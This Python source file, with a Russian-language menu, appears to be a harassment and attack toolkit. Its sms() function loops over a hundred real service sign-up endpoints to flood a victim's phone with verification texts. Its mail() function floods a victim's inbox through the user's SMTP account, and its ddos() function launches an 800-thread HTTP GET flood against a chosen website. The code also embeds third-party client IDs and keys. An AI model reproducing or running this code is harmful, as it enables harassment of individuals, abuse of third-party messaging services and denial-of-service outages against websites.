def setting():
  global url
  global url2
  global urlport
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ("Введите адрес сайта:")
  url = input(">>>").strip()
  if url == "":
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ("[!] Неправильный адрес")
    setting()
  try:
    if url[0]+url[1]+url[2]+url[3] == "www.":
      url = "http://" + url
    elif url[0]+url[1]+url[2]+url[3] == "http":
      pass
    else:
      url = "http://" + url
  except:                                                                                              
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ("[!] Неправильный адрес")
    setting()
  try:                                
    url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
  except:
    url2 = url.replace("http://", "").replace("https://", "").split("/")[0]                                                                               
  try:               
    urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
  except:
    urlport = "80"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
  global multiple
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ("Вставьте число умножения для атаки:")
  print ("[*] БОЛЬШЕ 1000 ТОЛЬКО ДЛЯ МОЩНЫХ ПК С ХОРОШИМ ИНТЕРНЕТОМ!")
  multiple = int(input(">>>"))
  ddos()

def sms():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите номер жертвы: (7XXXXXXXXX)')
  phone = input ('>>>')
  if len(phone) == 11 or len(phone) == 12 or len(phone) == 13:
    pass
  else:
    print ("[!] Неправильный номер.")
    time.sleep(2)
    sms()
  phone9 = phone[1:]
  phoneAresBank = "+"+ phone[0]+"("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phone9dostavista =  phone9[:3]+"+"+ phone9[3:6]+"-"+ phone9[6:8]+"-"+ phone9[8:10]
  phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
  phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  namechoose2 = ['Йувер', 'Цукенберг', 'Умерведённый', 'Екажорсеч', 'Нобиль', 'Гопарь', 'Шумерга']
  name = random.choice (namechoose2)
  while True:
    try:
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"]
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post('http://localhost:1459/attack/start', json={"number_of_cycles":"1000", "phone":phone}, headers={"Accept-Language":"ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection":"keep-alive", "Host":"localhost:1459", "Origin":"http://localhost:1459", "Referer":"http://localhost:1459/"})
    except:
        pass
    try:
        requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://cloud.mail.ru/api/v2/notify/applink", json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" +phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://vladikavkaz.edostav.ru/site/CheckAuthLogin", data={"phone_or_email":phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US, en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/registerphone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/", json={"mobile": "+" +phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + phone})
    except:
        pass
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/" +phone, json={"sender": "Tele2"})
    except:
        pass
    try:
        requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={"phoneNumber": phone, "countryCode": "ID", "name": "test", "email": "mail@mail.com", "deviceToken": "*"}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"})
    except:
        pass
    try:
        requests.post("https://belkacar.ru/get-confirmation-code", data={"phone": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.rabota.ru/remind", data={"credential": phone})
    except:
        pass
    try:
        requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php", data={"name": _name, "phone": phone, "promo": "yellowforma"})
    except:
        pass
    try:
        requests.get("https://www.oyorooms.com/api/pwa/generateotp?phone="+phone9+"&country_code=%2B7&nod=4&locale=en")
    except:
        pass
    try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://newnext.ru/graphql", json={"operationName": "registration", "variables": {"client": {"firstName": "Иван", "lastName": "Иванов", "phone": phone, "typeKeys": ["Unemployed"]}}, "query": "mutation registration($client: ClientInput!) {""\n  registration(client: $client) {""\n    token\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", json={"client_type": "personal", "email": _email, "mobilephone": phone, "deliveryOption": "sms"})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
    except:
        pass
    try:
        requests.post("https://online.sbis.ru/reg/service/", json={"jsonrpc":"2.0", "protocol":"5", "method":"Пользователь.ЗаявкаНаФизика", "params":{"phone":phone}, "id":"1"})
    except:
        pass
    try:
        requests.post("https://ib.psbank.ru/api/authentication/extendedClientAuthRequest", json={"firstName":"Иван", "middleName":"Иванович", "lastName":"Иванов", "sex":"1", "birthDate":"10.10.2000", "mobilePhone": phone9, "russianFederationResident":"true", "isDSA":"false", "personalDataProcessingAgreement":"true", "bKIRequestAgreement":"null", "promotionAgreement":"true"})
    except:
        pass
    try:
        requests.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": phone})
    except:
        pass
    try:
        requests.post("https://www.stoloto.ru/send-mobile-app-link", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers={"App-ID": "cabinet"})
    except:
        pass
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": phone, "type": 2})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.delivery-club.ru/ajax/user_otp", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://alfalife.cc/auth.php", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.cloudloyalty.ru/demo/send-code", json={"country": 2, "phone": phone, "roistatVisit": "47637", "experiments": {"new_header_title": "1"}})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.ollis.ru/gql", json={"query": "mutation { phone(number:'%s', locale:ru) { token error { code message } } }"% phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode", headers={"token": "."}, data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms", json={"userPhone": "+" + phone}, headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" +phone, "resend": 0})
    except:
        pass
    try:
        requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" +phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ru/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +phone})
    except:
        pass
    try:
        requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://pizzahut.ru/account/password-reset", data={"reset_by":"phone", "action_id":"pass-recovery", "phone": phone, "_token":"*"})
    except:
        pass
    try:
        requests.post("https://plink.tech/register/", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9})
    except:
        pass
    try:
        requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29", data={"caller_number": phone})
    except:
        pass
    try:
        requests.post("https://mousam.ru/api/checkphone", data={"phone": phone, "target": "android app v0.0.2"})
    except:
        pass
    try:
        requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": name, "firstName": name, "middleName": name, "mobilePhone": phone, "email": email,"smsCode": ""})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html", data={"mphone": phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"}, data={"loginId": "+" + phone})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone, "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php", data={"casePar": "authSendsms", "MobilePhone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONALphone]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/", data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle", json={"url": "/api/client/phone_verification", "method": "POST", "data": {"client_id": 5646981, "phone": phone, "alisa_id": 1}, "headers": {"Client-Id": 5646981, "Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONALphone]": phone, "code": "", "sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": json.dumps({"login": phone})})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callbackphonenumber", "phone": phone})
    except:
        pass
    try:
        requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/", data={"RECALL": "Y", "BACK_CALLphone": phone})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "call"})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "sms"})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/login/", data={"login": "+" + phone})
    except:
        pass
    try:
        requests.get("https://vezitaxi.com/api/employment/getsmscode", params={"phone": "+" + phone, "city": 561, "callback": "jsonp_callback_35979"})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "UA"})
    except:
        pass
    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": phone})
    except:
        pass
    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": phone, "password": _name})
    except:
        pass
    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': phone})                
    except:
        pass
    try:
        requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": phone})
    except:
        pass
    try:
        requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
                    pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klientphone": "+" + phone,"klient_email": email})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post('https://secure.online.ua/ajax/checkphone/', params={"regphone": phone})
    except:
        pass
    try:
        requests.post('https://mamamia.ua/api/auth/login', data={"phone": phone}) 
    except:
        pass
    try:
        requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false})
    except:
        pass
    try:
        requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"phone","nextStep":"auth-otp","__typename":"FlowResponse"}})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone":phone})
    except:
        pass
    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": phone})
    except:
        pass
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Спамер завершён')
    print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
    print ('[2] - ВЕРНУТСЯ В СПАМ СМС')
    choose3 = input ('>>>')
    if choose3 == '1':
      main()
    if choose3 == '2':
      sms()
    else:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      print ('[*] Вы автоматически перенаправлены в главное меню')
      time.sleep(2)
      main()

def mail():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите адрес почты с которой будеть отправляться сообщения (только почта яндекс или мэйл):')
  print ('ВНИМАНИЕ! К ПОЧТЕ ДОЛЖЕН БЫТЬ ПРИВЯЗАН НОМЕР ТЕЛЕФОНА!')
  L = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите пароль от почты:')
  P = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Если почта яндекс введите - smtp.mail.ru, если мэил smtp.yandex.ru')
  U = input(">>>")
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Почта жертвы')
  To = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Тема письма')
  T = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Текст письма')
  M = input ('>>>')
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Количество писем')
  N = input ('>>>')
  for value in range( int( N ) ):
    msg = MIMEMultipart()
    msg[ 'Subject' ] = T
    msg[ 'From' ] = L
    body = M
    msg.attach( MIMEText( body, 'plain' ) )
    server = root.SMTP_SSL( U, 465 )
    server.login( L, P )
    server.sendmail( L, To, msg.as_string() )
    server.quit()
    value += 1
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[*] Спамер завершён')
  print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
  print ('[2] - ВЕРНУТСЯ В СПАМ СМС')
  choose3 = input ('>>>')
  if choose3 == '1':
    main()
  if choose3 == '2':
    mail()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Вы автоматически перенаправлены в главное меню')
    time.sleep(2)
    main()

def ddos():
  global threads
  global get_host
  global acceptall
  global connection
  global go
  global x
  threads = 800
  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
  acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
  "Accept-Encoding: gzip, deflate\r\n", 
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xhtml+xml",
  "Accept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
  "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
  connection = "Connection: Keep-Alive\r\n"
  go = threading.Event()
  for x in range(threads):
    RequestDefaultHTTP(x+1).start()
    print ("[*] Пакет отправлен!")
  go.set()

def main():
  os.system('cls' if os.name=='nt' else 'clear')
  print (Fore.GREEN + logo)
  try:
      requests.get("http://google.com", verify=True)
  except:
      os.system('cls' if os.name=='nt' else 'clear')
      conection()
  print ('[1] - ОТКРЫТЬ СПАМЕР')
  print ('[2] - ОБНОВИТЬ СПАМЕР')
  choose = input ('>>>')
  if choose == '1':
    openspam()
  if choose == '2':
    openupdate()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    main()
      
def openspam():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
